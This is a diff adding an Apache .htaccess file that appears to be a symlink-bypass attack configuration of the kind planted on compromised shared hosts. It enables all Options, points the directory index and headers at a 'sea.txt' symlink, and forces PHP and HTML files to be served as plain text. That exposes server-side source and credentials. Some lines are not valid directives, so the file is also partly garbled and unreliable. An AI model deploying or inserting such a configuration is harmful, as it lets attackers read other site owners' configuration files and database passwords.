@@ -1,0 +1,14 @@
+
+DirectoryIndex sea.txt
+HeaderName sea.txt
+ReadmeName sea.txt
+footerName sea.txt
+ErrorDocument 404 /404.html 
+404.html = Symlinked sea.txt
+Options all
+ForceType text/plain
+AddType text/plain .php 
+AddType text/plain .html
+AddHandler server-parsed .php
+AddHandler txt .php
+	
